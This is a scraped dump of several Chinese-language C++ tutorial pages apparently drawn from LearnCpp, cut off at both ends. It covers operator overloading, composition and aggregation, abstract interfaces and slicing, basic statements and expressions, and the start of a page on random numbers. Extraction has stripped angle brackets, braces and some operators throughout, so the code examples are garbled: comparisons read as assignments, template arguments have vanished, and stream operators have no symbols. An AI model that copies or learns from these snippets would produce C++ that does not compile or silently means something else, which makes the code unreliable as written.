是生成闭包类型的更简洁方式。 重载 operator() 会让对象成为可调用对象，成员状态可保存配置、缓存或累计结果。const 限定决定 const 函数对象能否调用。与 lambda 一样，它适合传给算法；若对象可变并跨线程共享，还需要同步或值复制策略。 有状态函数对象 #include iostreamclass AtLeastpublic: explicit AtLeast(int minimum) : m_minimumminimum bool operator()(int value) const return value = m_minimum; private: int m_minimum;;int main() std::cout AtLeast3(5) ; operator() 让对象成为可调用策略，成员保存调用所需状态；lambda 是同类闭包的简洁写法。 重载类型转换转换运算符定义对象到目标类型的用户转换，通常不写返回类型。 可能丢失信息或意外参与重载的转换应声明 explicit；显式具名转换有时更易读。 转换运算符没有显式返回类型，目标类型写在函数名位置。非布尔转换通常应标记 explicit，避免在算术、重载和条件表达式中悄悄发生。对象真值语义可使用 explicit operator bool，它仍能用于条件上下文。 显式转换运算符 #include iostreamclass Handlepublic: explicit Handle(int value) : m_valuevalue explicit operator bool() const return m_value != 0; private: int m_value;;int main() if (Handle3) std::cout valid ; explicit operator bool 可以用于条件上下文，但不会随意参与整数或其他重载转换。 重载赋值运算符复制赋值修改已存在对象并通常返回 *this，必须正确处理自赋值和已有资源。 使用标准值成员可以让编译器生成正确赋值；资源类可用复制交换或明确移动策略。 复制赋值处理两个已经存在的对象，必须释放或替换目标旧状态并处理自赋值。标准资源成员通常能自动生成正确操作。自定义资源类型可使用先构造临时再交换的方式提供强保证，但应先考虑让 vector 或智能指针承担资源。 复制赋值处理已存在对象 #include iostream#include stringclass Labelpublic: explicit Label(std::string value) : m_valuestd::move(value) Label operator=(const Label) = default; const std::string value() const return m_value; private: std::string m_value;;int main() Label firsta, secondb; second = first; std::cout second.value() ; 标准值成员使默认赋值正确处理自赋值和资源；只有自定义所有权时才需要手写实现。 浅复制与深复制浅复制只复制句柄或指针，可能让多个对象误以为自己拥有同一资源。 值语义资源需要深复制，共享语义使用 shared_ptr，独占资源则禁止复制并支持移动。 拥有裸资源的类型若使用编译器生成复制，会得到两个指向同一资源的所有者，最终产生重复释放。深复制为目标对象重新取得资源并复制内容，但标准容器已经实现了这些操作；把裸数组替换为 std::vector 往往能让类回到零规则。 深复制独占动态数组 #include algorithm#include cstddef#include iostream#include memoryclass Bufferpublic: explicit Buffer(std::size_t size) : m_sizesize, m_datastd::make_uniqueint[](size) Buffer(const Buffer other) : Bufferother.m_size std::copy_n(other.m_data.get(), m_size, m_data.get()); int operator[](std::size_t index) return m_data[index]; private: std::size_t m_size; std::unique_ptrint[] m_data;;int main() Buffer first2; first[0] = 7; Buffer copyfirst; copy[0] = 9; std::cout first[0] copy[0] ; 复制构造重新分配并复制元素，因此两个对象独立拥有资源；普通业务优先直接使用 vector。 让标准容器负责深复制 struct Buffer std::vectorint values;;Buffer secondfirst; vector 的复制会创建独立元素存储，Buffer 可以遵循零规则。 运算符重载与函数模板模板运算符可以服务一族类型，但过宽候选会干扰其他重载和隐式转换。 使用概念、requires 或精确类型约束缩小参与范围，并保留正常代数关系。 模板运算符可以服务一族相关类型，但过宽模板会进入不相关表达式的候选集合并制造歧义。C++20 constraints 应限定允许的操作数和结果关系。隐式转换与普通重载仍共同参与选择，测试需覆盖混合类型边界。 约束模板运算符 #include concepts#include iostreamtemplate std::integral Tstruct Number T value; ;template std::integral TNumberT operator+(NumberT left, NumberT right) return left.value + right.value; int main() std::cout (Numberint2 + Numberint3).value ; std::integral 收窄候选范围，避免过宽模板干扰无关类型的重载解析。 运算符重载综合项目综合项目用于把多个运算符组织成一个保持不变量的值类型，而不是孤立展示语法。 实现应覆盖构造、比较、输入输出、算术、错误边界和测试，并避免重复运算逻辑。 综合类型先确定不变量和自然操作集合，再实现构造、观察、复合赋值与派生二元运算。输入输出、比较和转换不必一次全部提供；每增加一个运算符，都应验证返回值类别、const 行为、异常保证以及与内建类型直觉是否一致。 综合值类型：有理数 #include compare#include iostream#include numeric#include stdexceptclass Rationalpublic: Rational(int numerator, int denominator) : m_numeratornumerator, m_denominatordenominator if (denominator == 0) throw std::invalid_argumentzero denominator; const int divisorstd::gcd(m_numerator, m_denominator); m_numerator /= divisor; m_denominator /= divisor; if (m_denominator 0) m_numerator = -m_numerator; m_denominator = -m_denominator; friend Rational operator+(const Rational left, const Rational right) return left.m_numerator * right.m_denominator + right.m_numerator * left.m_denominator, left.m_denominator * right.m_denominator; friend bool operator==(const Rational, const Rational) = default; friend std::ostream operator(std::ostream out, const Rational value) return out value.m_numerator / value.m_denominator; private: int m_numerator; int m_denominator1;;int main() std::cout Rational1, 2 + Rational1, 3 ; 构造函数维持约分和正分母不变量，算术与输出都复用这一表示；大型整数还要增加溢出检查。 复合赋值作为二元运算的基础 Counter Counter::operator+=(const Counter other) m_value += other.m_value; return *this;Counter operator+(Counter left, const Counter right) return left += right; operator+ 复用 operator+ 的状态修改逻辑，并通过按值左操作数产生独立结果。 项目中的运算符只实现符合直觉且不破坏类不变量的操作；业务命令若没有自然代数含义，具名函数更清楚。 参考资料 LearnCpp 21.9：重载下标运算符 LearnCpp 21.10：重载函数调用运算符 LearnCpp 21.11：重载类型转换 LearnCpp 21.12：重载赋值运算符 LearnCpp 21.13：浅复制与深复制 LearnCpp 21.14：运算符重载与函数模板 LearnCpp 21.y：运算符重载综合项目 cppreference：运算符重载相关条目","tags":[null,null]},{"title":"组合、聚合、关联与依赖关系","path":"/wiki/cpp/cpp-topic-object-relationships.html","content":"组合、聚合、关联和依赖都能让对象互相使用，区别在于谁拥有谁、生命周期是否绑定、关系是否长期保存。容器类可以把底层集合和业务不变量集中管理，std::initializer_list 则为批量初始化提供只读临时范围。 概念索引 主题 规则边界 对象关系 对象关系应先描述所有权、生命周期和基数，再选择值成员、引用、指针或标识符实现。 组合关系 组合表示强 part-of 关系，整体拥有部件并控制其生命周期。 聚合关系 聚合中的部件独立存在，整体只引用而不负责销毁。 关联关系 关联表示对象之间可持续但不必拥有的联系，可以是单向、双向、一对一或一对多。 依赖关系 函数参数、局部变量和临时调用会形成短期依赖，依赖对象不作为长期成员保存。 容器类 容器类封装元素存储、长度和访问规则，对资源管理负责并提供明确迭代边界。 std::initializer_list initializer_list 提供对编译器生成的 const 元素数组的轻量视图，常用于花括号构造。 对象关系同样的“使用”关系可能是组合、聚合、关联或临时依赖，它们的销毁责任不同。 对象关系需要分别回答所有权、生命周期和可替换性。组合拥有部件，聚合借用外部对象，关联保存持续连接，依赖只在一次操作中使用。类图上的箭头不能替代这些运行时约束，成员类型和构造接口应把关系落到代码。 先写清所有权再选择成员类型 #include iostream#include memorystruct Engine int power; ;struct Car std::unique_ptrEngine engine; ;int main() Car carstd::make_uniqueEngine(Engine120); std::cout car.engine-power ; Car 独占 Engine，销毁时自动释放；如果 Engine 独立存在或共享，关系类型和成员表示都应改变。 组合关系值成员和 unique_ptr 都可表达组合，选择取决于可选性、多态需求和对象大小。 组合表示整体拥有部件，部件生命周期通常不超过整体，最直接的实现是值成员或独占智能指针。整体构造时建立部件，析构时自动释放。优先值成员能减少分配与空状态，只有多态或可选大对象等约束才需要间接所有权。 值成员表达强组合 #include iostreamclass Enginepublic: explicit Engine(int power) : m_powerpower int power() const return m_power; private: int m_power;;class Carpublic: explicit Car(int power) : m_enginepower int power() const return m_engine.power(); private: Engine m_engine;;int main() std::cout Car120.power() ; Engine 是 Car 的值成员，生命周期和整体完全绑定；无需空状态或多态时这是最直接的组合。 聚合关系实现可使用引用、观察指针或 reference_wrapper，但必须保证被观察对象生命周期足够长。 聚合关系中的对象引用外部独立实体，不负责其销毁。实现可保存引用包装、指针或稳定标识符，每种形式都必须规定失效条件。构造函数注入能确保初始关联存在，但所有者仍要活得更久。 reference_wrapper 表达非拥有聚合 #include functional#include iostream#include vectorstruct Player int score; ;class Teampublic: void add(Player player) m_players.emplace_back(player); int first_score() const return m_players.front().get().score; private: std::vectorstd::reference_wrapperPlayer m_players;;int main() Player player7; Team team; team.add(player); std::cout team.first_score() ; Team 不销毁 Player；调用方必须保证 Player 生命周期覆盖 Team 中引用的使用期。 关联关系双向关联需要集中维护两端一致性，并避免悬空指针和递归更新。 关联表示对象之间持续但通常非拥有的连接，可以是单向或双向。保存指针、引用包装或稳定标识符各有不同失效条件。双向关联要求所有修改路径同步两端，很多场景改为中央索引或单向关系会更容易维护。 用标识符维护可重连关联 #include iostream#include unordered_mapstruct User int id; ;int main() std::unordered_mapint, User users7, User7; const int owner_id7; if (const auto foundusers.find(owner_id); found != users.end()) std::cout found-second.id ; 保存标识符而不是裸指针，可以在容器重分配或对象重新加载后重新建立关联。 依赖关系依赖通过抽象接口注入可以改善测试和替换能力，但过度接口化会增加间接层。 依赖关系通常只存在于一次函数调用：参数、局部对象或临时结果足以表达，不需要保存成员。把短期依赖提升为长期成员会扩大生命周期耦合。构造函数注入适合对象整个生命周期都需要的服务，而函数参数适合单次操作。 参数表达短期依赖 #include iostreamclass Formatterpublic: void print(int value) const std::cout value= value ; ;void report(const Formatter formatter, int value) formatter.print(value); int main() report(Formatter, 7); report 只在调用期间依赖 Formatter，不把它保存成成员，也不拥有其生命周期。 容器类实现自定义容器需要处理复制移动、异常安全和迭代器失效；普通业务优先复用标准容器。 容器类把底层容器限制为领域操作，例如队列的 pushpop，而不是转发每个 vector 或 deque 成员。这样可以集中空状态、容量和元素不变量。若包装没有新增语义，直接使用标准容器通常更透明。 容器类封装存储和边界检查 #include cstddef#include iostream#include stdexcept#include vectorclass Scorespublic: void add(int score) if (score 0 || score 100) throw std::out_of_rangescore; m_values.push_back(score); int at(std::size_t index) const return m_values.at(index); private: std::vectorint m_values;;int main() Scores scores; scores.add(88); std::cout scores.at(0) ; Scores 复用 vector 的资源管理，同时在写入入口维护业务范围。 只暴露维护不变量所需的容器操作 class Queuepublic: void push(Job job) m_jobs.push_back(std::move(job)); std::optionalJob pop(); bool empty() const return m_jobs.empty(); private: std::dequeJob m_jobs;; 调用方不能任意修改底层 deque，Queue 可以集中定义空队列和弹出语义。 包装容器的价值在于集中不变量和业务操作，而不是把底层容器的全部成员重新转发一遍。 std::initializer_list元素不能通过列表修改，且优先级可能改变构造重载选择；不要保存超过底层数组生命周期的列表。 std::initializer_listT 是对编译器生成的 const T 数组的轻量视图，复制列表不会复制元素。花括号初始化会优先考虑接收 initializer_list 的构造函数，这可能让看似相同的圆括号与花括号选择不同重载。列表适合一次调用中的只读遍历，不应作为长期拥有元素的容器。 initializer_list 构造只读元素视图 #include initializer_list#include iostreamint sum(std::initializer_listint values) int result; for (int value : values) result += value; return result;int main() std::cout sum(1, 2, 3) ; 列表元素是 const，底层数组生命周期有限；接收后应立即消费或复制需要长期保存的内容。 参考资料 LearnCpp 23.1：对象关系 LearnCpp 23.2：组合关系 LearnCpp 23.3：聚合关系 LearnCpp 23.4：关联关系 LearnCpp 23.5：依赖关系 LearnCpp 23.6：容器类 LearnCpp 23.7：std::initializer_list cppreference：对象关系相关条目","tags":[null,null]},{"title":"抽象接口、对象切片与安全向下转换","path":"/wiki/cpp/cpp-topic-polymorphic-design.html","content":"纯虚函数让基类只定义接口，派生类提供具体实现。多态对象按值传递会只复制基类子对象并丢失派生状态，因此异构集合通常保存基类智能指针。确实需要向下转换时，dynamic_cast 只能在多态层次中验证运行时类型。 纯虚函数、抽象基类与接口类纯虚函数以 0 声明，含未实现纯虚函数的类不能实例化。 接口类通常只提供虚析构和纯虚操作，具体实现类负责状态与资源。 纯虚函数让类成为抽象基类，不能直接实例化，但仍可拥有状态、普通成员和已定义的纯虚函数实现。接口类通常只保留虚析构和纯虚操作。派生类必须完成全部纯虚覆盖，才能形成具体类型。 纯虚接口和具体实现 #include iostream#include string_viewclass Logger public: virtual ~Logger() = default; virtual void write(std::string_view message) = 0; ;class ConsoleLogger final : public Logger public: void write(std::string_view message) override std::cout message ; ;int main() ConsoleLogger logger; logger.write(ready); Logger 不能实例化，只描述调用契约；实现类负责状态和资源。 对象切片把派生对象按值复制到基类对象只保留基类子对象，派生状态和动态类型信息丢失。 多态集合应保存智能指针或引用包装器，而不是 vector。 把派生对象按值转换或复制到基类对象，只保留基类子对象，派生状态和动态行为都被切掉。多态集合通常保存 std::unique_ptrBase，只读算法可接收 const Base；需要值语义复制时，常通过虚 clone() 显式定义。 多态集合保存智能指针 #include iostream#include memory#include vectorclass Base public: virtual ~Base() = default; virtual int value() const return 1; ;class Derived final : public Base public: int value() const override return 2; ;int main() std::vectorstd::unique_ptrBase values; values.push_back(std::make_uniqueDerived()); std::cout values.front()-value() ; vector 会按值复制基类子对象并切掉派生部分；智能指针集合保留动态类型和所有权。 通过引用保留动态类型 void draw_all(const std::vectorstd::unique_ptrShape shapes) for (const auto shape : shapes) shape-draw(); 容器拥有派生对象，基类指针保留虚调用，不会发生按值切片。 异构集合保存基类智能指针，临时观察使用引用；需要多态复制时通过虚 clone 明确产生新的动态对象。 dynamic_castdynamic_cast 在多态层次中执行运行时检查的向下或横向转换。 指针转换失败返回 nullptr，引用转换失败抛出 std::bad_cast；频繁转换通常提示基类接口不足。 dynamic_cast 依赖多态基类的运行时类型信息。指针转换失败返回空指针，引用转换失败抛出 std::bad_cast。偶尔在系统边界验证动态类型是合理的，业务流程若频繁向下转换，更可能是基类缺少所需虚接口。 运行时检查向下转换 #include iostreamclass Base public: virtual ~Base() = default; ;class Derived final : public Base public: int value7; ;int main() Derived derived; Base* basederived; if (auto* actualdynamic_castDerived*(base)) std::cout actual-value ; 指针转换失败返回 nullptr，引用转换失败抛出 bad_cast；频繁向下转换通常说明基类接口不足。 先通过虚接口表达常规行为 void inspect(const Shape shape) shape.describe(std::cout); 频繁向下转换通常说明基类接口缺少调用方真正依赖的操作。 继承层次的 operator 输出可以只为基类重载 operator，再委托给虚成员函数输出动态类型内容。 虚成员接收并返回 ostream 引用，能够保持链式输出且避免为每个派生类型重复非成员重载。 非成员 operator 本身不能是虚函数，常见做法是让它调用基类的虚 print 成员。这样流组合保持非成员形式，派生类只覆盖输出细节。面向人阅读的文本与稳定序列化格式应分开维护。 非成员输出委托给虚成员 #include iostreamclass Basepublic: virtual ~Base() = default; virtual void print(std::ostream out) const out base; ;class Derived final : public Base public: void print(std::ostream out) const override out derived; ;std::ostream operator(std::ostream out, const Base value) value.print(out); return out; int main() std::cout Derived ; operator 只需为基类定义一次，虚成员再依据动态类型输出内容，并保留流的链式接口。 通过基类所有者保存异构对象 std::vectorstd::unique_ptrShape shapes;shapes.push_back(std::make_uniqueCircle());shapes.push_back(std::make_uniqueRectangle());for (const auto shape : shapes) shape-draw(); unique_ptr 管理每个动态对象，基类虚接口保留实际派生类型的行为。 输出接口放在基类虚函数或非成员包装中都可以，选择应避免每次增加派生类都修改中央类型分支。 参考资料 LearnCpp 25.7：纯虚函数、抽象基类与接口类 LearnCpp 25.9：对象切片 LearnCpp 25.10：dynamic_cast LearnCpp 25.11：继承层次的 operator 输出 cppreference：虚函数相关条目","tags":[null,null]},{"title":"算术、比较与递增运算符重载","path":"/wiki/cpp/cpp-topic-operator-algebra.html","content":"运算符重载不会改变优先级、结合性和操作数数量，只是为自定义类型提供函数实现。算术运算通常以复合赋值为基础，比较操作应维持一致的等价与顺序关系，递增则区分前置和后置返回语义。 概念索引 主题 规则边界 运算符重载 运算符重载为用户类型定义已有运算符行为，不能创建新运算符或改变优先级和参数数量。 使用友元函数重载算术运算符 对称二元运算符常写成非成员友元，使左右操作数都能参与隐式转换。 使用普通函数重载运算符 非成员运算符不需要友元权限时应只使用公开接口，减少与类表示耦合。 重载输入输出运算符 流运算符返回流引用以支持链式调用，输出通常接受 const 对象。 使用成员函数重载运算符 成员运算符的左操作数是隐式对象，因此赋值、下标、调用和箭头运算符必须写成成员。 重载一元 +、- 与 ! 一元运算符成员形式通常不接显式参数，并应返回与内建语义相符的值。 重载比较运算符 相等和排序必须满足自反性、对称性、传递性等关系要求，容器算法依赖这些性质。 重载递增与递减运算符 前置形式通常返回修改后对象引用，后置形式用未使用的 int 参数区分并返回修改前副本。 运算符重载重载语义应符合该符号常见预期，否则具名函数更清楚。 运算符重载只是具有特殊名称的函数，至少一个操作数必须是类或枚举类型，不能改变优先级、结合性或操作数数量。只重载具有自然语义的操作，并保持返回类型与内建运算符习惯一致，调用代码才不会隐藏意外成本。 为值类型定义自然运算 #include iostreamstruct Distance int meters; ;Distance operator+(Distance left, Distance right) return left.meters + right.meters; int main() std::cout (Distance2 + Distance3).meters ; 重载不能改变操作数数量或优先级；行为应符合加法对该值类型的常见含义。 使用友元函数重载算术运算符复合赋值通常先作为成员实现，再让普通算术运算复用它以保持一致。 非成员友元运算符能对两个操作数进行对称隐式转换，并直接访问私有表示，适合二元算术值类型。先实现复合赋值，再让 operator+ 等按值复制左操作数并复用它，可集中状态修改逻辑。友元权限应只服务不变量。 友元实现对称二元运算 #include iostreamclass Counterpublic: explicit Counter(int value) : m_valuevalue friend Counter operator+(Counter left, Counter right) return Counterleft.m_value + right.m_value; int value() const return m_value; private: int m_value;;int main() std::cout (Counter2 + Counter3).value() ; 非成员友元让左右操作数都能参与转换；不需要私有访问时应只调用公开接口。 使用普通函数重载运算符把它放在与类型相同的命名空间可让实参依赖查找找到重载。 运算不需要私有访问时，普通非成员函数保持类接口更小，也让左右操作数转换对称。它可以只通过公开接口实现。将运算符放在与类型相同的命名空间中还能参与实参相关查找，无需把所有函数都声明为成员或友元。 普通非成员运算符复用公开接口 #include iostreamclass Counterpublic: explicit Counter(int value) : m_valuevalue int value() const return m_value; private: int m_value;;Counter operator+(Counter left, Counter right) return Counterleft.value() + right.value(); int main() std::cout (Counter2 + Counter4).value() ; 普通函数不依赖类私有表示，并应放在与类型相同命名空间中参与实参依赖查找。 重载输入输出运算符输入应在临时值解析和验证成功后再修改目标对象，失败时保留一致状态并设置流状态。 插入运算符返回原 ostream 以支持链式输出；提取运算符返回 istream 并在失败时设置状态。输入应先解析临时值，全部验证通过后再修改对象，避免留下半更新状态。持久化格式不应仅依赖面向人的输出形式。 输入成功后再提交对象状态 #include iostreamstruct Point int x; int y; ;std::istream operator(std::istream in, Point point) int x, y; if (in x y) point = x, y; return in;std::ostream operator(std::ostream out, const Point point) return out point.x , point.y; int main() Point point; if (std::cin point) std::cout point ; 先解析到临时变量，全部成功后才修改 point；两个运算符都返回流引用以支持链式调用。 复合赋值作为二元运算的基础 Counter Counter::operator+=(const Counter other) m_value += other.m_value; return *this;Counter operator+(Counter left, const Counter right) return left += right; operator+ 复用 operator+ 的状态修改逻辑，并通过按值左操作数产生独立结果。 序列化格式属于接口契约，输入重载应避免在失败时留下部分修改的对象，输出重载要保留流格式和错误状态。 使用成员函数重载运算符需要左操作数隐式转换的对称运算符通常不适合成员形式。 赋值、下标、调用和箭头等运算符必须是成员，其他运算符可根据对称性与私有访问选择成员或非成员。成员二元运算的左操作数固定为当前对象，可能阻止左侧发生转换。选择形式应先匹配自然调用语义。 必须为成员的赋值运算符 #include iostreamclass Counterpublic: Counter operator+=(int amount) m_value += amount; return *this; int value() const return m_value; private: int m_value;;int main() Counter counter; counter += 3; std::cout counter.value() ; 成员运算符的左操作数是隐含对象；赋值、下标、调用和箭头运算符必须定义为成员。 重载一元 +、- 与 !逻辑非适合表达空或无效状态；避免同时提供含义冲突的隐式 bool 转换。 一元运算符通常实现为无参数成员或接收一个操作数的非成员函数。返回新值的 - 不应修改源对象，逻辑 ! 应表达对象的布尔否定。若操作没有普遍可预期含义，具名查询函数比复用符号更清楚。 一元运算保持内建语义 #include iostreamstruct Vector int x; int y; ;Vector operator-(Vector value) return -value.x, -value.y; int main() const auto value-Vector2, 3; std::cout value.x , value.y ; 一元负号产生新值而不修改原对象；逻辑非通常用于表达空或无效状态。 重载比较运算符C++20 operator 可以生成一组关系运算，但浮点成员可能导致 partial_ordering。 C++20 的三路比较可以集中定义顺序关系，默认实现按成员声明顺序比较。返回类别取决于成员：整数通常形成强序，浮点成员可能形成偏序，因为 NaN 与其他值无序。业务对象若不应按全部成员排序，应显式定义真正有意义的键。 C++20 三路比较 #include compare#include iostreamstruct Version int major; int minor; auto operator=(const Version) const = default;;int main() std::cout (Version1, 2 Version2, 0) ; 默认 operator 按成员声明顺序比较并生成关系运算；浮点成员可能产生 partial_ordering。 三路比较运算符 = 自 C++20 可用，默认比较可以同时生成多种关系运算。 重载递增与递减运算符后置形式可能产生额外复制，调用方不需要旧值时使用前置形式。 前置递增通常修改对象并返回 T，后置递增以未使用的 int 形参区分，并返回修改前的值副本。自定义迭代器需要保持这一约定才能与泛型代码配合。若旧值无用途，调用方优先前置形式。 前置和后置递增 #include iostreamclass Counterpublic: Counter operator++() ++m_value; return *this; Counter operator++(int) Counter old*this; ++(*this); return old; int value() const return m_value; private: int m_value;;int main() Counter counter; const auto oldcounter++; std::cout old.value() counter.value() ; 后置形式用未使用的 int 参数区分并返回旧副本；不需要旧值时使用前置形式。 参考资料 LearnCpp 21.1：运算符重载 LearnCpp 21.2：使用友元函数重载算术运算符 LearnCpp 21.3：使用普通函数重载运算符 LearnCpp 21.4：重载输入输出运算符 LearnCpp 21.5：使用成员函数重载运算符 LearnCpp 21.6：重载一元 +、- 与 ! LearnCpp 21.7：重载比较运算符 LearnCpp 21.8：重载递增与递减运算符 cppreference：运算符重载相关条目","tags":[null,null]},{"title":"语句、变量、输入输出与表达式","path":"/wiki/cpp/cpp-topic-program-elements.html","content":"一段可以运行的 C++ 程序同时包含语法结构和运行时状态：声明创建对象，初始化给出初始状态，表达式读取或修改对象，语句决定这些动作发生的顺序。把这些基础概念放回同一个程序中，比逐个记忆名词更容易看清它们之间的关系。 语句与程序结构语句是程序执行动作的基本单位，声明、表达式、返回和控制流语句承担不同职责。 函数体由复合语句组成；最小程序必须提供全局作用域中的 main 函数作为托管环境入口。 一个完整语句以分号结束，复合语句则用花括号把多条语句组合为一个整体。main 的函数体本身就是复合语句；其中的声明创建对象，表达式语句完成计算或产生副作用，return 把退出状态交还给宿主环境。空语句 ; 也合法，因此控制语句后多写的分号并不一定报错，却可能悄悄改变分支或循环的范围。 从语句到程序入口 #include iostreamint main() const int width4; const int height3; const int areawidth * height; std::cout area ; 声明、表达式和输出语句按源代码顺序执行；main 返回后，托管环境得到退出状态。 注释行注释适合短说明，块注释适合连续文本，但块注释不能可靠嵌套。 注释应解释约束、原因和不明显的边界，不能替代清晰命名，也不能保留已经失效的代码副本。 注释在翻译早期被当作空白处理，不能改变程序语义。适合留下来的内容通常是单位、协议约束、算法取舍和无法由类型表达的前置条件；逐行复述代码会与实现一起老化。临时屏蔽代码更适合交给版本控制或 #if 0，因为块注释不能可靠嵌套。 让注释说明约束 #include iostreamint main() const int timeout_ms500; // The value is in milliseconds because the API expects an integer count. std::cout timeout_ms ; 注释说明单位和约束，变量名负责表达常规含义；注释不会改变编译器看到的程序结构。 对象与变量对象是一段具有类型和值的存储区域，变量是通过名称访问对象的常见方式。 类型决定对象表示、可用操作和生命周期规则；同一值用不同类型保存时可能具有不同范围和转换行为。 声明 int attempts0; 同时给出名称、类型和初值。对象是运行时存在的实体，变量是访问对象的一种命名方式；引用也有名称，却不是一个可独立改绑的新对象。后面讨论引用、指针和移动语义时，这个区别会直接影响生命周期判断。 对象、类型和值 #include iostreamint main() int attempts0; attempts += 1; std::cout attempts ; attempts 访问一个具有 int 类型的对象，复合赋值修改同一对象的值。 变量赋值与初始化初始化发生在对象生命周期开始时，赋值修改已经存在的对象，两者会调用不同的语言机制。 列表初始化能够拒绝多数窄化转换；现代 C++ 通常使用花括号或直接初始化表达构造意图。 C++ 的初始化形式会参与构造函数选择。花括号初始化拒绝多数窄化转换，圆括号初始化允许更广的转换，= 初始化仍然是初始化而不是赋值。对象已经存在后再写 value = expression，才会进入赋值运算；对类类型而言，两者可能调用完全不同的函数。 初始化与赋值 #include iostreamint main() int count2; count = 3; const int doubledcount * 2; std::cout doubled ; count 在生命周期开始时初始化，之后的 count 3 是赋值；doubled 初始化后不能再赋值。 iostream、cout、cin 与换行iostream 提供标准输入输出流，插入运算符写入值，提取运算符按目标类型解析输入。 换行字符不会强制刷新缓冲区；std::endl 同时换行和刷新，只在确实要求立即提交时使用。 operator 按目标类型读取并跳过前导空白，转换失败后会设置流状态，目标对象不应被当作有效输入继续使用。 只写入换行字符，std::endl 还会刷新缓冲区；普通逐行输出没有立即提交的要求时，额外刷新会增加 IO 次数。 读取一条记录并输出结果 #include iostreamint main() int quantity; double price; if (!(std::cin quantity price)) return 1; std::cout quantity * price ; 提取运算符把输入转换为目标类型；输入失败时应在进入计算前处理错误状态。 未初始化变量与未定义行为具有自动存储期的基本类型在默认初始化后可能保持不确定值，读取它们会导致错误或未定义行为。 值初始化和编译器警告可以尽早暴露问题；不能依靠调试构建中偶然出现的零值。 未定义行为不是“随机返回一个值”的运行时规则，而是标准不再约束整个程序的行为。初始化能够消除一类不确定值读取，高警告级别和运行时检查还能发现部分路径；它们都不能把含有未定义行为的程序变成可依赖的程序。 让初始化消除不确定状态 #include iostreamint main() int total; for (int value : 2, 4, 6) total += value; std::cout total ; 值初始化把 total 设为零；自动对象如果只声明不初始化，不能依赖调试构建中偶然出现的内容。 初始化后再参与计算 int total;for (int value : 2, 4, 6) total += value; 值初始化建立确定的起始状态；不能用一次运行中碰巧得到的零替代初始化。 关键字与标识符命名关键字由语言保留，不能作为标识符；标识符还受作用域、链接性和名称查找规则约束。 以下划线加大写字母开头以及包含双下划线的名称保留给实现，业务代码应避开这些形式。 名称查找区分作用域，也区分大小写。以下划线后接大写字母的名称在任何作用域保留，含双下划线的名称也保留给实现；全局作用域中以下划线开头的名称同样应避开。选择业务名称时，类型名、对象名和函数名保持项目内一致，比依赖缩写更重要。 使用不会与实现保留形式冲突的名称 #include iostreamint main() const int user_count3; std::cout user_count ; user_count 是合法的用户标识符；实现保留的双下划线和下划线加大写字母形式不应出现在业务代码中。 空白与基础格式多数空白只用于分隔记号，但字符串字面量、预处理指令和注释中的空白可能影响含义。 稳定的自动格式化规则能够减少无关差异，同时缩进必须准确反映块和控制流结构。 空白通常只负责分隔记号，但预处理指令在换行处结束，字符串字面量内部的空白也属于数据。缩进不参与语法，却是人工审查控制流边界的重要线索；自动格式化应统一括号与换行，而不是靠对齐空格表达隐藏结构。 缩进反映控制流 #include iostreamint main() for (int value1; value = 3; ++value) if (value % 2 == 1) std::cout value ; 空白通常只分隔记号，但缩进让代码块的边界可见；格式化不能替代花括号和正确语法。 字面量与运算符字面量把值直接写入源代码，后缀和前缀可以改变类型或进制解释。 运算符对操作数形成表达式；同一符号可能因操作数类型不同而选择内建或重载行为。 运算符与操作数组成表达式，同一符号可能拥有不同含义：* 既能做乘法，也能解引用指针。实际行为由操作数类型、可用重载和转换共同决定。只看符号名称不足以判断结果类型，更不能据此推断求值顺序。 字面量和运算符组合表达式 #include iostreamint main() const int packets5; const int bytes_per_packet128; std::cout packets * bytes_per_packet ; 整数和运算符形成表达式；操作数类型决定使用整数乘法及其溢出规则。 表达式表达式由字面量、变量、函数调用和运算符组合，并产生值、对象或副作用。 求值结果的类型和值类别会影响重载解析、生命周期和能否赋值，不能只按算术公式理解表达式。 表达式既有类型，也有值类别，还可能包含副作用。a + b 产生一个值，a = b 修改对象并产生左值，函数调用的结果则由返回类型决定。后面的重载解析、引用绑定和移动语义都会读取这些属性，因此“能算出什么”只是表达式分析的一部分。 把复杂表达式拆成有名字的状态 #include iostreamint main() const int used7; const int capacity10; const bool has_roomused capacity; std::cout std::boolalpha has_room ; 比较表达式产生 bool 值；把它绑定到 has_room 后，副作用和控制流边界更清晰。 设计第一个程序小程序也应先明确输入、输出和非法输入处理，再把计算拆成可以命名和测试的步骤。 输入、计算与输出分离后，业务函数可以脱离控制台独立验证，main 只负责组织流程。 第一个程序也可以先把数据契约写清楚：输入哪些值、哪些范围无效、计算结果用什么类型表示、失败时返回什么。把纯计算放进独立函数后，main 只负责终端交互和流程组织，后续测试无需模拟控制台。 把输入、计算和输出分开 #include iostreamdouble subtotal(int quantity, double price) return quantity * price;int main() int quantity; double price; if (!(std::cin quantity price) || quantity 0 || price 0.0) return 1; std::cout subtotal(quantity, price) ; subtotal 不依赖终端，输入校验和输出位于 main；同一计算函数可以单独测试。 把终端交互与计算逻辑分开 struct Order int quantity; int unit_price_cents;;int total_cents(const Order order) return order.quantity * order.unit_price_cents; 核心函数只依赖参数并返回结果，读取输入和格式化输出可以在 main 中独立处理。 终端读取、计算函数和格式化输出分开后，非法输入不会进入核心计算，计算逻辑也能直接由普通函数调用覆盖。 小程序的规模虽然有限，输入、计算和输出仍然可以分开。这个边界会在函数、测试和多文件组织中继续发挥作用。 参考资料 LearnCpp 1.1：语句与程序结构 LearnCpp 1.2：注释 LearnCpp 1.3：对象与变量 LearnCpp 1.4：变量赋值与初始化 LearnCpp 1.5：iostream、cout、cin 与换行 LearnCpp 1.6：未初始化变量与未定义行为 LearnCpp 1.7：关键字与标识符命名 LearnCpp 1.8：空白与基础格式 LearnCpp 1.9：字面量与运算符 LearnCpp 1.10：表达式 LearnCpp 1.11：设计第一个程序 cppreference：C++ 基础相关条目","tags":[null,null]},{"title":"随机引擎、分布与可复现序列","path":"/wiki/cpp/cpp-topic-random-numbers.html","content":"标准库随机数设施把状态推进和结果分布拆成两个对象。引擎负责生成伪随机比特序列，分布负责把序列转换成整数、实数或其他目标形态。测试通常需要固定种子，普通应用可以选择非固定种子；安全令牌则不应依赖通用伪随机引擎。 随机数生成随机数设施分为产生原始状态序列的引擎和把结果映射到目标范围的分布。 不要使用取模把引擎结果压缩到范围，这会引入分布偏差；也不要用 rand 作为新代码默认方案。 伪随机引擎从内部状态确定性地产生序列，分布再把结果映射到目标范围。随机性需求必须区分模拟、测试和安全令牌：标准引擎适合前两者，不提供密码学安全保证。每次取值都重新播种会破坏序列质量和可复现性。 随机设备只负责提供种子来源 #include iostream#include randomint main() std::random_device 